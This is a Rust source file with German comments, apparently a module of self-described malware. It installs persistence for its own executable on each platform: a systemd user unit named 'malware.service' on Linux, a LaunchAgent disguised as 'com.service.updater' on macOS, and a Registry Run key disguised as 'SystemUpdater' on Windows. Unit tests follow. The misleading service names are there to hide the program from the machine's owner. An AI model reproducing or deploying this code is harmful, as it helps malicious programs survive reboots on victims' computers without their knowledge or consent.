// Für jedes Betriebssystem wird nur der passende Code-Block komopiliert

use anyhow::{Context, Result};
use std::fs;
use std::path::{Path, PathBuf};
use std::process::Command;

/// Richtet den Autostart für das aktuelle Betriebssystem ein.
///
/// Diese Funktion entscheidet zur Kompilierzeit, welche Logik verwendet wird.
pub fn enable_autostart() -> Result<()> {
    // Pfad zur aktuellen Executable ermitteln
    let exe = std::env::current_exe().context("Konnte Pfad zur Executable nicht ermitteln")?;

    // Je nach OS die passende Logik starten
    enable_autostart_dispatch(&exe)
}

// Dispatcher, der zur Compile Zeit entscheidet
fn enable_autostart_dispatch(exe_path: &Path) -> Result<()> {
    #[cfg(target_os = "linux")]
    {
        let home = dirs::home_dir().context("Konnte Home-Verzeichnis nicht finden")?;
        setup_linux_persistence(&home, exe_path)
    }
    #[cfg(target_os = "macos")]
    {
        let home = dirs::home_dir().context("Konnte Home-Verzeichnis nicht finden")?;
        setup_macos_persistence(&home, exe_path)
    }

    #[cfg(target_os = "windows")]
    {
        setup_windows_persistence(exe_path)
    }

    #[cfg(not(any(target_os = "linux", target_os = "macos", target_os = "windows")))]
    {
        Ok(())
    }
}

// Linux Logik
#[cfg(any(target_os = "linux", test))]
fn generate_linux_service_content(exe_path: &Path) -> String {
    format!(
        "[Unit]\nDescription=SystemService\n\n[Service]\nType=forking\nExecStart={}\nRestart=always\n\n[Install]\nWantedBy=default.target\n",
        exe_path.display()
    )
}

#[cfg(any(target_os = "linux", test))]
fn setup_linux_persistence(home_dir: &Path, exe_path: &Path) -> Result<()> {
    let service_dir = home_dir.join(".config/systemd/user");
    let service_file = service_dir.join("malware.service");

    // Prüfen ob schon existent
    if service_file.exists() {
        return Ok(());
    }

    // Dirs erstellen
    fs::create_dir_all(&service_dir).context("Konnte Systemd User Verzeichnis nicht erstellen")?;

    // Inhalt generieren und schreiben
    let content = generate_linux_service_content(exe_path);
    fs::write(&service_file, content).context("Konnte Service-Datei nicht schreiben")?;

    // Aktivieren (Nur wenn wir nicht im Test-Modus sind, da wir keine echten Systemctl Befehle im Test wollen)
    #[cfg(not(test))]
    {
        let _ = Command::new("systemctl")
            .args(["--user", "enable", "malware"])
            .status();
    }

    Ok(())
}

// MacOS Logik
#[cfg(any(target_os = "macos", test))]
fn generate_macos_plist_content(exe_path: &Path) -> String {
    format!(
        r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key><string>com.service.updater</string>
  <key>ProgramArguments</key>
  <array><string>{}</string></array>
  <key>RunAtLoad</key><true/>
</dict>
</plist>"#,
        exe_path.display()
    )
}

#[cfg(any(target_os = "macos", test))]
fn setup_macos_persistence(home_dir: &Path, exe_path: &Path) -> Result<()> {
    let agents_dir = home_dir.join("Library/LaunchAgents");
    let plist_path = agents_dir.join("com.service.updater.plist");

    if plist_path.exists() {
        return Ok(());
    }

    fs::create_dir_all(&agents_dir)?;
    let content = generate_macos_plist_content(exe_path);
    fs::write(&plist_path, content)?;

    Ok(())
}

// Windwos Logik
#[cfg(target_os = "windows")]
fn setup_windows_persistence(exe_path: &Path) -> Result<()> {
    let key = r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run";
    let value_name = "SystemUpdater";

    // 1. Check via Registry Query
    let status = Command::new("reg")
        .args(["query", key, "/v", value_name])
        .output();

    if let Ok(output) = status {
        if output.status.success() {
            return Ok(());
        }
    }

    // 2. Add via Registry Add
    Command::new("reg")
        .args([
            "add",
            key,
            "/v",
            value_name,
            "/t",
            "REG_SZ",
            "/d",
            &exe_path.display().to_string(),
            "/f",
        ])
        .status()
        .context("Fehler beim Ausführen des reg-Befehls")?;

    Ok(())
}

// tests
#[cfg(test)]
mod tests {
    use super::*;
    use std::env;
    use std::fs;

    // Temporäres Home Verzeichnis erstellen
    fn get_temp_home() -> PathBuf {
        let mut dir = env::temp_dir();
        dir.push("rust_malware_test_persistence");
        let _ = fs::create_dir(&dir); // Ignorieren wenn existiert
        dir
    }

    // LINUX TESTS
    #[test]
    fn test_linux_service_content_generation() {
        // Nur String generierung testen
        let fake_exe = Path::new("/usr/bin/malware");
        let content = generate_linux_service_content(fake_exe);

        assert!(content.contains("ExecStart=/usr/bin/malware"));
        assert!(content.contains("Type=forking"));
        assert!(content.contains("[Unit]"));
    }

    #[test]
    fn test_linux_file_creation() {
        // Schreiben der Datei in einem Test Ordner simulieren
        let temp_home = get_temp_home();
        let fake_exe = Path::new("/tmp/test_exe");

        // Logik mit Temp-Home Verzeichnis aufrufen
        let result = setup_linux_persistence(&temp_home, fake_exe);
        assert!(result.is_ok());

        // Prüfen ob die Struktur erstellt wurde: ~/.config/systemd/user/malware.service
        let expected_path = temp_home.join(".config/systemd/user/malware.service");
        assert!(expected_path.exists(), "Service Datei wurde nicht erstellt");

        // Inhalt prüfen
        let content = fs::read_to_string(expected_path.clone()).unwrap();
        assert!(content.contains("/tmp/test_exe"));

        // Cleanup
        let _ = fs::remove_file(expected_path);
    }

    // --- MACOS TESTS ---
    #[test]
    fn test_macos_plist_content_generation() {
        let fake_exe = Path::new("/Applications/malware");
        let content = generate_macos_plist_content(fake_exe);

        assert!(content.contains("<string>/Applications/malware</string>"));
        assert!(content.contains("com.service.updater"));
    }

    #[test]
    fn test_macos_file_creation() {
        let temp_home = get_temp_home();
        let fake_exe = Path::new("/tmp/test_mac");

        let result = setup_macos_persistence(&temp_home, fake_exe);
        assert!(result.is_ok());

        let expected_path = temp_home.join("Library/LaunchAgents/com.service.updater.plist");
        assert!(expected_path.exists(), "Plist Datei wurde nicht erstellt");

        let content = fs::read_to_string(expected_path.clone()).unwrap();
        assert!(content.contains("/tmp/test_mac"));

        let _ = fs::remove_file(expected_path);
    }
}
